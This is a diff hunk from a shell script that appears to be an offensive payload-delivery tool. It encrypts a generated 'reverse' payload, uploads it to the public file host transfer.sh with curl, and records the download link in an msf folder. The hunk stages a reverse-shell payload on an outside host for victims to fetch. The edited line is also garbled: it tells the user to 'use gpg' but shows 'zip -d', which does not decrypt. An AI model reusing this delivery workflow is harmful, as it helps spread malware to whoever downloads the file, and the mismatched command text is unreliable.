@@ -56,7 +56,7 @@ if [ $UPLOAD_choice = "yy" ]; then
 	zip -e $ENCRYPTEDFILE $TEMP/$FILE*
 	curl --upload-file $ENCRYPTEDFILE https://transfer.sh/reverse.zip > $LINKFILE
 	echo "\033[1;32m:::: Uploading the file into transfer.sh ... \033[0m"
-	echo "\033[1;32m:::: Remember: To download the payload you need to use gpg in your command, like this: \$ openssl aes-256-cbc -d -pbkdf2 -in reverse.encrypted -out reverse.exe\033[0m"
+	echo "\033[1;32m:::: Remember: To download the payload you need to use gpg in your command, like this: \$ zip -d $FILE\033[0m"
 	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
 	echo "\033[1;42m::::DONE\033[0m"
 	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
